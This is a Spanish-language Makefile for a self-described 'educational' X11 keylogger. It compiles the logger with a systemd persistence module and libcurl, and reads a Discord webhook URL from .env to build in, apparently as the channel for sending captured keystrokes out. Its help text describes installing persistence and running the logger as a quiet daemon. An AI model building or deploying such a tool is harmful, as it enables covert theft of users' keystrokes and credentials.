# Makefile para X11 Educational Keylogger

CC = gcc
CFLAGS = -Wall -Wextra -O2
LDFLAGS = -lX11 -lXtst -lpthread -lcurl
TARGET = x11_keylogger
SOURCE = src/x11_keylogger.c
PERSIST_SRC = src/persistence.c
PERSIST_OBJ = src/persistence.o

# Leer webhook de Discord desde .env
DISCORD_WEBHOOK := ""
ifneq ("$(wildcard .env)","")
	DISCORD_WEBHOOK := $(shell grep DISCORD_WEBHOOK_URL .env | cut -d= -f2 | tr -d '"')
endif

# Si webhook no está vacío, compilar con flag DISCORD_WEBHOOK
ifneq ("$(DISCORD_WEBHOOK)","")
	CFLAGS += -DDISCORD_WEBHOOK="\"$(DISCORD_WEBHOOK)\""
endif

# Colores para output
RED = \033[0;31m
GREEN = \033[0;32m
YELLOW = \033[1;33m
NC = \033[0m # No Color

.PHONY: all clean install uninstall help

all: $(PERSIST_OBJ) $(TARGET)

# Compilar módulo de persistencia
$(PERSIST_OBJ): $(PERSIST_SRC) src/persistence.h
	@echo "$(GREEN)Compilando persistence.c...$(NC)"
	$(CC) $(CFLAGS) -c $(PERSIST_SRC) -o $(PERSIST_OBJ)

# Compilar keylogger (con persistencia)
$(TARGET): $(SOURCE) $(PERSIST_OBJ)
	@echo "$(GREEN)Compilando $(TARGET) con persistencia...$(NC)"
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE) $(PERSIST_OBJ) $(LDFLAGS)
	@echo "$(GREEN)✓ Compilación exitosa!$(NC)"
	@echo "$(YELLOW)Ejecute './$(TARGET) --install-persistence' para instalar$(NC)"

clean:
	@echo "$(YELLOW)Limpiando archivos compilados...$(NC)"
	rm -f $(TARGET)
	rm -f $(PERSIST_OBJ)
	rm -f src/*.o
	rm -f *.o
	@echo "$(GREEN)✓ Limpieza completa$(NC)"

# Instalar (requiere sudo)
install: $(TARGET)
	@echo "$(YELLOW)Instalando $(TARGET)...$(NC)"
	install -m 755 $(TARGET) /usr/local/bin/
	@echo "$(GREEN)✓ Instalado en /usr/local/bin/$(TARGET)$(NC)"
	@echo "$(YELLOW)Ejecute 'x11_keylogger --install-persistence' para habilitar persistencia$(NC)"

# Desinstalar (requiere sudo)
uninstall:
	@echo "$(YELLOW)Desinstalando $(TARGET)...$(NC)"
	rm -f /usr/local/bin/$(TARGET)
	@echo "$(GREEN)✓ Desinstalado$(NC)"

# Mostrar ayuda
help:
	@echo "$(GREEN)X11 Educational Keylogger - Makefile$(NC)"
	@echo ""
	@echo "Uso:"
	@echo "  make              - Compilar el keylogger con persistencia"
	@echo "  make clean        - Eliminar archivos compilados"
	@echo "  make install      - Instalar en /usr/local/bin (requiere sudo)"
	@echo "  make uninstall    - Desinstalar de /usr/local/bin (requiere sudo)"
	@echo "  make help         - Mostrar esta ayuda"
	@echo ""
	@echo "$(YELLOW)Requisitos:$(NC)"
	@echo "  - Sistema Linux con X11"
	@echo "  - gcc compilador"
	@echo "  - libx11-dev (desarrollo de Xlib)"
	@echo "  - systemd (para persistencia)"
	@echo ""
	@echo "$(YELLOW)Después de compilar:$(NC)"
	@echo "  ./x11_keylogger --install-persistence    # Instalar persistencia"
	@echo "  ./x11_keylogger --daemon --quiet         # Ejecutar como daemon"
	@echo "  ./x11_keylogger --help                    # Ver todas las opciones"
